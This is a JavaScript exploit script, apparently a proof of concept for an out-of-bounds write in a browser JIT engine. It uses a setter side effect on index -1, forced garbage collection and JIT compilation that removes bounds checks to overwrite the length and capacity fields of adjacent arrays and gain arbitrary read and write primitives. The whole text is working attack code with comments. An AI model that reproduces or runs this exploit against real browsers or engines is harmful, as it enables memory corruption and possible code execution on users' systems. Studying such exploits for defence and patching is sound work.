oob_arr = [1.1, 1.2, , 1.4];          // This is used to trigger the side effect. It's not in the above diagram
victim = new Array(0x20);        // This array will have its length set to zero so it can write over the capacity/length values of setter_arr
setter_arr = new Array(0x20);  // This array will be used to read and set pointers reliably and repeatably in rw_arr
rw_arr = new Array(0x20);        // Used for arbitrary reads and writes

// Side effects
oob_arr.__defineSetter__("-1", function(x) {
    console.log("[+] Side Effects reached");
    victim.length = 0;
    setter_arr.length = 0;
    rw_arr.length = 0;
    gc();
});

// Call the GC - Phoenhex's function
function gc() {
    const maxMallocBytes=128*1024*1024; // 128m
    for (var i =0; i <3; i++) {
        var x = new ArrayBuffer(maxMallocBytes); // Allocate locally, but don't save
    }
}

// Exploit
function jitme(index, in2, in3) {
    // Removes future bounds checks with GVN
    victim[in2] = 4.2;
    victim[in2 - 1] = 4.2;

    // Trggers the side-effect function
    oob_arr[index] = 2.2;

    // Write out-of-bounds
    victim[in2] = in3; // capacity and length
    victim[in2 - 1] = 2.673714696616e-312; // initLength and flags
}

// JIT the exploit
for(i=0;i<0x10000;i++) {
    oob_arr.length = 4; // Reset the length so that the StoreElementHole node is used
    jitme(5, 11, 2.67371469724e-312);
}

oob_arr.length = 4; // Reset the length one more time
jitme(-1, 11, 2.67371469724e-312); // Call the jitted function with the side-effect index (-1)

console.log("Done OutOfBounds2 exploit.\n");
